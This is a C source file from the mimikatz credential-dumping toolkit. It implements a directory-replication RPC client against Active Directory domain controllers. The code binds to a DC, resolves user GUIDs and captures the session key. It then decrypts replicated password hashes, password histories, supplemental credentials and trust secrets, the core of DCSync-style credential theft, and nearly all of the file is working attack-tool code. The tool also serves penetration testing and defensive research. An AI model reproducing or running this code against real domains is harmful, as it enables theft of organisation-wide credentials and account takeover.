/*	Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com / http://blog.gentilkiwi.com )
	Vincent LE TOUX ( vincent.letoux@gmail.com / http://www.mysmartlogon.com )
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kull_m_rpc_drsr.h"

SecPkgContext_SessionKey kull_m_rpc_drsr_g_sKey = {0, NULL};
void RPC_ENTRY kull_m_rpc_drsr_RpcSecurityCallback(void *Context)
{
	RPC_STATUS rpcStatus;
	SECURITY_STATUS secStatus;
	PCtxtHandle data = NULL;

	rpcStatus = I_RpcBindingInqSecurityContext(Context, (LPVOID *) &data);
	if(rpcStatus == RPC_S_OK)
	{
		if(kull_m_rpc_drsr_g_sKey.SessionKey)
		{
			FreeContextBuffer(kull_m_rpc_drsr_g_sKey.SessionKey);
			kull_m_rpc_drsr_g_sKey.SessionKeyLength = 0;
			kull_m_rpc_drsr_g_sKey.SessionKey = NULL;
		}
		secStatus = QueryContextAttributes(data, SECPKG_ATTR_SESSION_KEY, (LPVOID) &kull_m_rpc_drsr_g_sKey);
		if(secStatus != SEC_E_OK)
			PRINT_ERROR(L"QueryContextAttributes %08x\n", secStatus);
	}
	else PRINT_ERROR(L"I_RpcBindingInqSecurityContext %08x\n", rpcStatus);
}

GUID DRSUAPI_DS_BIND_GUID_Standard	= {0xe24d201a, 0x4fd6, 0x11d1, {0xa3, 0xda, 0x00, 0x00, 0xf8, 0x75, 0xae, 0x0d}};
BOOL kull_m_rpc_drsr_getDomainAndUserInfos(RPC_BINDING_HANDLE *hBinding, LPCWSTR ServerName, LPCWSTR Domain, GUID *DomainGUID, LPCWSTR User, LPCWSTR Guid, GUID *UserGuid, DRS_EXTENSIONS_INT *pDrsExtensionsInt)
{
	BOOL DomainGUIDfound = FALSE, ObjectGUIDfound = FALSE;
	DWORD i;
	ULONG drsStatus;
	DRS_HANDLE hDrs = NULL;
	DRS_MSG_DCINFOREQ dcInfoReq = {0};
	DWORD dcOutVersion = 0;
	DRS_MSG_DCINFOREPLY dcInfoRep = {0};
	LPWSTR sGuid;
	UNICODE_STRING uGuid;

	RtlZeroMemory(pDrsExtensionsInt, sizeof(DRS_EXTENSIONS_INT));
	pDrsExtensionsInt->cb = sizeof(DRS_EXTENSIONS_INT) - sizeof(DWORD);
	pDrsExtensionsInt->dwFlags = DRS_EXT_GETCHGREPLY_V6 | DRS_EXT_STRONG_ENCRYPTION;
	if(kull_m_rpc_drsr_getDCBind(hBinding, &DRSUAPI_DS_BIND_GUID_Standard, &hDrs, pDrsExtensionsInt))
	{
		RpcTryExcept
		{
			dcInfoReq.V1.InfoLevel = 2;
			dcInfoReq.V1.Domain = (LPWSTR) Domain;
			drsStatus = IDL_DRSDomainControllerInfo(hDrs, 1, &dcInfoReq, &dcOutVersion, &dcInfoRep);
			if(drsStatus == 0)
			{
				if(dcOutVersion == 2)
				{
					for(i = 0; i < dcInfoRep.V2.cItems; i++)
					{
						if(!DomainGUIDfound && ((_wcsicmp(ServerName, dcInfoRep.V2.rItems[i].DnsHostName) == 0) || (_wcsicmp(ServerName, dcInfoRep.V2.rItems[i].NetbiosName) == 0)))
						{
							DomainGUIDfound = TRUE;
							*DomainGUID = dcInfoRep.V2.rItems[i].NtdsDsaObjectGuid;
						}
					}
					if(!DomainGUIDfound)
						PRINT_ERROR(L"DomainControllerInfo: DC \'%s\' not found\n", ServerName);
				}
				else PRINT_ERROR(L"DomainControllerInfo: bad version (%u)\n", dcOutVersion);
				kull_m_rpc_drsr_free_DRS_MSG_DCINFOREPLY_data(dcOutVersion, &dcInfoRep);
			}
			else PRINT_ERROR(L"DomainControllerInfo: 0x%08x (%u)\n", drsStatus, drsStatus);

			if(Guid)
			{
				RtlInitUnicodeString(&uGuid, Guid);
				ObjectGUIDfound = NT_SUCCESS(RtlGUIDFromString(&uGuid, UserGuid));
			}
			else if(User)
			{
				if(kull_m_rpc_drsr_CrackName(hDrs, wcschr(User, L'\\') ? DS_NT4_ACCOUNT_NAME : wcschr(User, L'=') ? DS_FQDN_1779_NAME : wcschr(User, L'@') ? DS_USER_PRINCIPAL_NAME : DS_NT4_ACCOUNT_NAME_SANS_DOMAIN, User, DS_UNIQUE_ID_NAME, &sGuid, NULL))
				{
					RtlInitUnicodeString(&uGuid, sGuid);
					ObjectGUIDfound = NT_SUCCESS(RtlGUIDFromString(&uGuid, UserGuid));
				}
			}
		}
		RpcExcept(RPC_EXCEPTION)
			PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
		RpcEndExcept

	}
	return (DomainGUIDfound && (ObjectGUIDfound || !(Guid || User)));
}

BOOL kull_m_rpc_drsr_getDCBind(RPC_BINDING_HANDLE *hBinding, GUID *NtdsDsaObjectGuid, DRS_HANDLE *hDrs, DRS_EXTENSIONS_INT *pDrsExtensionsInt)
{
	BOOL status = FALSE;
	ULONG drsStatus;
	DRS_EXTENSIONS_INT *pDrsExtensionsOutput = NULL;
	RpcTryExcept
	{
		drsStatus = IDL_DRSBind(*hBinding, NtdsDsaObjectGuid, (DRS_EXTENSIONS *) pDrsExtensionsInt, (DRS_EXTENSIONS **) &pDrsExtensionsOutput, hDrs); // to free ?
		if(drsStatus == 0)
		{
			if(pDrsExtensionsOutput)
			{
				if(pDrsExtensionsOutput->cb >= FIELD_OFFSET(DRS_EXTENSIONS_INT, SiteObjGuid) - sizeof(DWORD))
				{
					if(pDrsExtensionsOutput->dwFlags & (DRS_EXT_GETCHGREQ_V8 | DRS_EXT_STRONG_ENCRYPTION))
						status = TRUE;
					else PRINT_ERROR(L"Incorrect DRS Extensions Output (%08x)\n", pDrsExtensionsOutput->dwFlags);

					if(pDrsExtensionsOutput->cb >= FIELD_OFFSET(DRS_EXTENSIONS_INT, Pid) - sizeof(DWORD))
					{
						pDrsExtensionsInt->SiteObjGuid = pDrsExtensionsOutput->SiteObjGuid;
						if(pDrsExtensionsOutput->cb >= FIELD_OFFSET(DRS_EXTENSIONS_INT, dwFlagsExt) - sizeof(DWORD))
						{
							pDrsExtensionsInt->dwReplEpoch = pDrsExtensionsOutput->dwReplEpoch;
							if(pDrsExtensionsOutput->cb >= FIELD_OFFSET(DRS_EXTENSIONS_INT, ConfigObjGUID) - sizeof(DWORD))
							{
								pDrsExtensionsInt->dwExtCaps = MAXDWORD32;
								//pDrsExtensionsInt->dwFlagsExt = pDrsExtensionsOutput->dwFlagsExt & (DRS_EXT_RECYCLE_BIN | DRS_EXT_PAM);
								if(pDrsExtensionsOutput->cb >= FIELD_OFFSET(DRS_EXTENSIONS_INT, dwExtCaps) - sizeof(DWORD))
									pDrsExtensionsInt->ConfigObjGUID = pDrsExtensionsOutput->ConfigObjGUID;
							}
						}
					}
				}
				else PRINT_ERROR(L"Incorrect DRS Extensions Output Size (%u)\n", pDrsExtensionsOutput->cb);
				MIDL_user_free(pDrsExtensionsOutput);
			}
			else PRINT_ERROR(L"No DRS Extensions Output\n");

			if(!status)
				IDL_DRSUnbind(hDrs);
		}
		else PRINT_ERROR(L"IDL_DRSBind: %u\n", drsStatus);
	}
	RpcExcept(RPC_EXCEPTION)
		PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
	RpcEndExcept
		return status;
}

const wchar_t * KULL_M_RPC_DRSR_CrackNames_Error[] = {L"NO_ERROR", L"ERROR_RESOLVING", L"ERROR_NOT_FOUND", L"ERROR_NOT_UNIQUE", L"ERROR_NO_MAPPING", L"ERROR_DOMAIN_ONLY", L"ERROR_NO_SYNTACTICAL_MAPPING", L"ERROR_TRUST_REFERRAL"};
BOOL kull_m_rpc_drsr_CrackName(DRS_HANDLE hDrs, DS_NAME_FORMAT NameFormat, LPCWSTR Name, DS_NAME_FORMAT FormatWanted, LPWSTR *CrackedName, LPWSTR *CrackedDomain)
{
	BOOL status = FALSE;
	DRS_MSG_CRACKREQ nameCrackReq = {0};
	DWORD nameCrackOutVersion = 0, drsStatus;
	DRS_MSG_CRACKREPLY nameCrackRep = {0};

	nameCrackReq.V1.formatOffered = NameFormat;
	nameCrackReq.V1.formatDesired = FormatWanted;
	nameCrackReq.V1.cNames = 1;
	nameCrackReq.V1.rpNames = (LPWSTR *) &Name;
	RpcTryExcept
	{
		drsStatus = IDL_DRSCrackNames(hDrs, 1, &nameCrackReq, &nameCrackOutVersion, &nameCrackRep);
		if(drsStatus == 0)
		{
			if(nameCrackOutVersion == 1)
			{
				if(nameCrackRep.V1.pResult->cItems == 1)
				{
					drsStatus = nameCrackRep.V1.pResult->rItems[0].status;
					if(status = (drsStatus == DS_NAME_NO_ERROR))
					{
						kull_m_string_copy(CrackedName, nameCrackRep.V1.pResult->rItems[0].pName);
						kull_m_string_copy(CrackedDomain, nameCrackRep.V1.pResult->rItems[0].pDomain);
					}
					else PRINT_ERROR(L"CrackNames (name status): 0x%08x (%u) - %s\n", drsStatus, drsStatus, (drsStatus < ARRAYSIZE(KULL_M_RPC_DRSR_CrackNames_Error)) ? KULL_M_RPC_DRSR_CrackNames_Error[drsStatus] : L"?");
				}
				else PRINT_ERROR(L"CrackNames: no item!\n");
			}
			else PRINT_ERROR(L"CrackNames: bad version (%u)\n", nameCrackOutVersion);
			kull_m_rpc_drsr_free_DRS_MSG_CRACKREPLY_data(nameCrackOutVersion, &nameCrackRep);
		}
		else PRINT_ERROR(L"CrackNames: 0x%08x (%u)\n", drsStatus, drsStatus);
	}
	RpcExcept(RPC_EXCEPTION)
		PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
	RpcEndExcept

	return status;
}

LPCSTR kull_m_rpc_drsr_encrypted_oids[] = {
	szOID_ANSI_unicodePwd, szOID_ANSI_ntPwdHistory, szOID_ANSI_dBCSPwd, szOID_ANSI_lmPwdHistory, szOID_ANSI_supplementalCredentials,
	szOID_ANSI_trustAuthIncoming, szOID_ANSI_trustAuthOutgoing,
	szOID_ANSI_currentValue,
};
BOOL kull_m_rpc_drsr_ProcessGetNCChangesReply(SCHEMA_PREFIX_TABLE *prefixTable, REPLENTINFLIST *objects) // very partial, ofc
{
	ATTRTYP attSensitive[ARRAYSIZE(kull_m_rpc_drsr_encrypted_oids)];
	REPLENTINFLIST * pReplentinflist, *pNextReplentinflist = objects;
	DWORD i, j, k;

	for(i = 0; i < ARRAYSIZE(attSensitive); i++)
	{
		if(!kull_m_rpc_drsr_MakeAttid(prefixTable, kull_m_rpc_drsr_encrypted_oids[i], &attSensitive[i], FALSE))
		{
			PRINT_ERROR(L"Unable to MakeAttid for %S\n", kull_m_rpc_drsr_encrypted_oids[i]);
			return FALSE;
		}
	}
	
	while(pReplentinflist = pNextReplentinflist)
	{
		pNextReplentinflist = pReplentinflist->pNextEntInf;
		if(pReplentinflist->Entinf.AttrBlock.pAttr)
		{
			for(i = 0; i < pReplentinflist->Entinf.AttrBlock.attrCount; i++)
			{
				for(j = 0; j < ARRAYSIZE(attSensitive); j++)
				{
					if(attSensitive[j] == pReplentinflist->Entinf.AttrBlock.pAttr[i].attrTyp)
					{
						if(pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal)
						for(k = 0; k < pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.valCount; k++)
							if(pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal[k].pVal)
								if(!kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt(&pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal[k]))
									return FALSE;
						break;
					}
				}
			}
		}
	}
	return TRUE;
}

BOOL kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt(ATTRVAL *val)
{
	BOOL status = FALSE;
	PENCRYPTED_PAYLOAD encrypted;
	MD5_CTX md5ctx;
	CRYPTO_BUFFER cryptoKey = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, NULL}, cryptoData;
	DWORD realLen, calcChecksum;
	PVOID toFree;

	if(kull_m_rpc_drsr_g_sKey.SessionKey && kull_m_rpc_drsr_g_sKey.SessionKeyLength)
	{
		if((val->valLen >= (ULONG) FIELD_OFFSET(ENCRYPTED_PAYLOAD, EncryptedData)) && val->pVal)
		{
			encrypted = (PENCRYPTED_PAYLOAD) val->pVal;
			MD5Init(&md5ctx);
			MD5Update(&md5ctx, kull_m_rpc_drsr_g_sKey.SessionKey, kull_m_rpc_drsr_g_sKey.SessionKeyLength);
			MD5Update(&md5ctx, encrypted->Salt, sizeof(encrypted->Salt));
			MD5Final(&md5ctx);
			cryptoKey.Buffer = md5ctx.digest;

			cryptoData.Length = cryptoData.MaximumLength = val->valLen - FIELD_OFFSET(ENCRYPTED_PAYLOAD, CheckSum);
			cryptoData.Buffer = (PBYTE) &encrypted->CheckSum;

			if(NT_SUCCESS(RtlEncryptDecryptRC4(&cryptoData, &cryptoKey)))
			{
				realLen = val->valLen - FIELD_OFFSET(ENCRYPTED_PAYLOAD, EncryptedData);
				if(kull_m_crypto_hash(CALG_CRC32, encrypted->EncryptedData, realLen, &calcChecksum, sizeof(calcChecksum)))
				{
					if(calcChecksum == encrypted->CheckSum)
					{
						toFree = val->pVal;
						if(val->pVal = (UCHAR *) MIDL_user_allocate(realLen))
						{
							RtlCopyMemory(val->pVal, encrypted->EncryptedData, realLen);
							val->valLen = realLen;
							status = TRUE;
							MIDL_user_free(toFree);
						}
					}
					else PRINT_ERROR(L"Checksums don\'t match (C:0x%08x - R:0x%08x)\n", calcChecksum, encrypted->CheckSum);
				}
				else PRINT_ERROR(L"Unable to calculate CRC32\n");
			}
			else PRINT_ERROR(L"RtlEncryptDecryptRC4\n");
		}
		else PRINT_ERROR(L"No valid data\n");
	}
	else PRINT_ERROR(L"No Session Key\n");
	return status;
}

void kull_m_rpc_drsr_free_DRS_MSG_CRACKREPLY_data(DWORD nameCrackOutVersion, DRS_MSG_CRACKREPLY * reply)
{
	DWORD i;
	if(reply)
	{
		switch (nameCrackOutVersion)
		{
		case 1:
			if(reply->V1.pResult)
			{
				for(i = 0; i < reply->V1.pResult->cItems; i++)
				{
					if(reply->V1.pResult->rItems[i].pDomain)
						MIDL_user_free(reply->V1.pResult->rItems[i].pDomain);
					if(reply->V1.pResult->rItems[i].pName)
						MIDL_user_free(reply->V1.pResult->rItems[i].pName);
				}
				if(reply->V1.pResult->rItems)
					MIDL_user_free(reply->V1.pResult->rItems);
				MIDL_user_free(reply->V1.pResult);
			}
			break;
		default:
			PRINT_ERROR(L"nameCrackOutVersion not valid (0x%08x - %u)\n", nameCrackOutVersion, nameCrackOutVersion);
			break;
		}
	}
}

void kull_m_rpc_drsr_free_DRS_MSG_DCINFOREPLY_data(DWORD dcOutVersion, DRS_MSG_DCINFOREPLY * reply)
{
	DWORD i;
	if(reply)
	{
		switch (dcOutVersion)
		{
		case 2:
			for(i = 0; i < reply->V2.cItems; i++)
			{
				if(reply->V2.rItems[i].NetbiosName)
					MIDL_user_free(reply->V2.rItems[i].NetbiosName);
				if(reply->V2.rItems[i].DnsHostName)
					MIDL_user_free(reply->V2.rItems[i].DnsHostName);
				if(reply->V2.rItems[i].SiteName)
					MIDL_user_free(reply->V2.rItems[i].SiteName);
				if(reply->V2.rItems[i].SiteObjectName)
					MIDL_user_free(reply->V2.rItems[i].SiteObjectName);
				if(reply->V2.rItems[i].ComputerObjectName)
					MIDL_user_free(reply->V2.rItems[i].ComputerObjectName);
				if(reply->V2.rItems[i].ServerObjectName)
					MIDL_user_free(reply->V2.rItems[i].ServerObjectName);
				if(reply->V2.rItems[i].NtdsDsaObjectName)
					MIDL_user_free(reply->V2.rItems[i].NtdsDsaObjectName);
			}
			if(reply->V2.rItems)
				MIDL_user_free(reply->V2.rItems);
			break;
		case 1:
		case 3:
		case 0xffffffff:
			PRINT_ERROR(L"TODO (maybe?)\n");
			break;
		default:
			PRINT_ERROR(L"dcOutVersion not valid (0x%08x - %u)\n", dcOutVersion, dcOutVersion);
			break;
		}
	}
}

void kull_m_rpc_drsr_free_DRS_MSG_GETCHGREPLY_data(DWORD dwOutVersion, DRS_MSG_GETCHGREPLY * reply)
{
	DWORD i, j;
	REPLENTINFLIST *pReplentinflist, *pNextReplentinflist;
	if(reply)
	{
		switch(dwOutVersion)
		{
		case 6:
			if(reply->V6.pNC)
				MIDL_user_free(reply->V6.pNC);
			if(reply->V6.pUpToDateVecSrc)
				MIDL_user_free(reply->V6.pUpToDateVecSrc);
			kull_m_rpc_drsr_free_SCHEMA_PREFIX_TABLE_data(&reply->V6.PrefixTableSrc);
			pNextReplentinflist = reply->V6.pObjects;
			while(pReplentinflist = pNextReplentinflist)
			{
				pNextReplentinflist = pReplentinflist->pNextEntInf;
				if(pReplentinflist->Entinf.pName)
					MIDL_user_free(pReplentinflist->Entinf.pName);
				if(pReplentinflist->Entinf.AttrBlock.pAttr)
				{
					for(i = 0; i < pReplentinflist->Entinf.AttrBlock.attrCount; i++)
					{
						if(pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal)
						{
							for(j = 0; j < pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.valCount; j++)
								if(pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal[j].pVal)
									MIDL_user_free(pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal[j].pVal);
							MIDL_user_free(pReplentinflist->Entinf.AttrBlock.pAttr[i].AttrVal.pAVal);
						}
					}
					MIDL_user_free(pReplentinflist->Entinf.AttrBlock.pAttr);
				}
				if(pReplentinflist->pParentGuid)
					MIDL_user_free(pReplentinflist->pParentGuid);
				if(pReplentinflist->pMetaDataExt)
					MIDL_user_free(pReplentinflist->pMetaDataExt);
				MIDL_user_free(pReplentinflist);
			}
			if(reply->V6.rgValues)
			{
				for(i = 0; i < reply->V6.cNumValues; i++)
				{
					if(reply->V6.rgValues[i].pObject)
						MIDL_user_free(reply->V6.rgValues[i].pObject);
					if(reply->V6.rgValues[i].Aval.pVal)
						MIDL_user_free(reply->V6.rgValues[i].Aval.pVal);
				}
				MIDL_user_free(reply->V6.rgValues);
			}
			break;
		case 1:
		case 2:
		case 7:
		case 9:
			PRINT_ERROR(L"TODO (maybe?)\n");
			break;
		default:
			PRINT_ERROR(L"dwOutVersion not valid (0x%08x - %u)\n", dwOutVersion, dwOutVersion);
			break;
		}
	}
}

void kull_m_rpc_drsr_free_SCHEMA_PREFIX_TABLE_data(SCHEMA_PREFIX_TABLE *prefixTable)
{
	DWORD i;
	if(prefixTable)
	{
		if(prefixTable->pPrefixEntry)
		{
			for(i = 0; i < prefixTable->PrefixCount; i++)
				if(prefixTable->pPrefixEntry[i].prefix.elements)
					MIDL_user_free(prefixTable->pPrefixEntry[i].prefix.elements);
			MIDL_user_free(prefixTable->pPrefixEntry);
		}
	}
}

LPSTR kull_m_rpc_drsr_OidFromAttid(SCHEMA_PREFIX_TABLE *prefixTable, ATTRTYP type)
{
	LPSTR szOid = NULL;
	DWORD i;
	USHORT low = (USHORT) type, idx = (USHORT) (type >> 16);
	OID_t *pLittleOid = NULL;
	OssEncodedOID encodedOid;

	for(i = 0; i < prefixTable->PrefixCount; i++)
	{
		if(prefixTable->pPrefixEntry[i].ndx == idx)
		{
			pLittleOid = &prefixTable->pPrefixEntry[i].prefix;
			break;
		}
	}
	if(pLittleOid)
	{
		encodedOid.length = (USHORT) (pLittleOid->length + ((low < 0x80) ? 1 : 2));
		if(encodedOid.value = (PBYTE) LocalAlloc(LPTR, encodedOid.length))
		{
			RtlCopyMemory(encodedOid.value, pLittleOid->elements, pLittleOid->length);
			if(low < 0x80)
				encodedOid.value[pLittleOid->length] = (BYTE) low;
			else
			{
				if(low >= 0x8000)
					low -= 0x8000;
				encodedOid.value[pLittleOid->length] = (BYTE) (((low / 0x80) % 0x80) + 0x80);
				encodedOid.value[pLittleOid->length + 1] = (BYTE) (low % 0x80);
			}
			if(!kull_m_asn1_Eoid2DotVal(&encodedOid, &szOid))
				szOid = NULL;
			LocalFree(encodedOid.value);
		}
	}
	return szOid;
}

DWORD kull_m_rpc_drsr_MakeAttid_addPrefixToTable(SCHEMA_PREFIX_TABLE *prefixTable, OssEncodedOID *oidPrefix, DWORD *ndx, BOOL toAdd)
{
	BOOL status = FALSE;
	DWORD i;
	PrefixTableEntry *entries;

	for(i = 0; i < prefixTable->PrefixCount; i++)
	{
		if(prefixTable->pPrefixEntry[i].prefix.length == oidPrefix->length)
		{
			if(RtlEqualMemory(prefixTable->pPrefixEntry[i].prefix.elements, oidPrefix->value, oidPrefix->length))
			{
				status = TRUE;
				*ndx = prefixTable->pPrefixEntry[i].ndx;
				break;
			}
		}
	}
	if(!status && toAdd)
	{
		*ndx = prefixTable->PrefixCount;
		if(entries = (PrefixTableEntry *) MIDL_user_allocate(sizeof(PrefixTableEntry) * ((*ndx) + 1)))
		{
			RtlCopyMemory(entries, prefixTable->pPrefixEntry, sizeof(PrefixTableEntry) * (*ndx));
			entries[*ndx].ndx = *ndx;
			entries[*ndx].prefix.length = oidPrefix->length;
			if(entries[*ndx].prefix.elements = (PBYTE) MIDL_user_allocate(oidPrefix->length))
			{
				RtlCopyMemory(entries[*ndx].prefix.elements, oidPrefix->value, oidPrefix->length);
				if(prefixTable->pPrefixEntry)
					MIDL_user_free(prefixTable->pPrefixEntry);
				prefixTable->pPrefixEntry = entries;
				prefixTable->PrefixCount++;
				status = TRUE;
			}
		}
	}
	return status;
}

BOOL kull_m_rpc_drsr_MakeAttid(SCHEMA_PREFIX_TABLE *prefixTable, LPCSTR szOid, ATTRTYP *att, BOOL toAdd)
{
	BOOL status = FALSE;
	DWORD lastValue, ndx;
	PSTR lastValueString;
	OssEncodedOID oidPrefix;

	if(lastValueString = strrchr(szOid, '.'))
	{
		if(*(lastValueString + 1))
		{
			lastValueString++;
			lastValue = strtoul(lastValueString, NULL, 0);
			*att = (WORD) lastValue % 0x4000;
			if(*att >= 0x4000)
				*att += 0x8000;
			if(kull_m_asn1_DotVal2Eoid(szOid, &oidPrefix))
			{
				oidPrefix.length -= (lastValue < 0x80) ? 1 : 2;
				if(status = kull_m_rpc_drsr_MakeAttid_addPrefixToTable(prefixTable, &oidPrefix, &ndx, toAdd))
					*att |= ndx << 16;
				else PRINT_ERROR(L"kull_m_rpc_drsr_MakeAttid_addPrefixToTable");
				kull_m_asn1_freeEnc(oidPrefix.value);
			}
		}
	}
	return status;
}

ATTRVALBLOCK * kull_m_rpc_drsr_findAttr(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, LPCSTR szOid)
{
	ATTRVALBLOCK *ptr = NULL;
	DWORD i;
	ATTR *attribut;
	ATTRTYP type;
	if(kull_m_rpc_drsr_MakeAttid(prefixTable, szOid, &type, FALSE))
	{
		for(i = 0; i < attributes->attrCount; i++)
		{
			attribut = &attributes->pAttr[i];
			if(attribut->attrTyp == type)
			{
				ptr = &attribut->AttrVal;
				break;
			}
		}
	}
	else PRINT_ERROR(L"Unable to get an ATTRTYP for %S\n", szOid);
	return ptr;
}

PVOID kull_m_rpc_drsr_findMonoAttr(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, LPCSTR szOid, PVOID data, DWORD *size)
{
	PVOID ptr = NULL;
	ATTRVALBLOCK *valblock;

	if(data)
		*(PVOID *)data = NULL;
	if(size)
		*size = 0;
	
	if(valblock = kull_m_rpc_drsr_findAttr(prefixTable, attributes, szOid))
	{
		if(valblock->valCount == 1)
		{
			ptr = valblock->pAVal[0].pVal;
			if(data)
				*(PVOID *)data = ptr;
			if(size)
				*size = valblock->pAVal[0].valLen;
		}
	}
	return ptr;
}

void kull_m_rpc_drsr_findPrintMonoAttr(LPCWSTR prefix, SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, LPCSTR szOid, BOOL newLine)
{
	PVOID ptr;
	DWORD sz;
	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOid, &ptr, &sz))
		kprintf(L"%s%.*s%s", prefix ? prefix : L"", sz / sizeof(wchar_t), (PWSTR) ptr, newLine ? L"\n" : L"");
}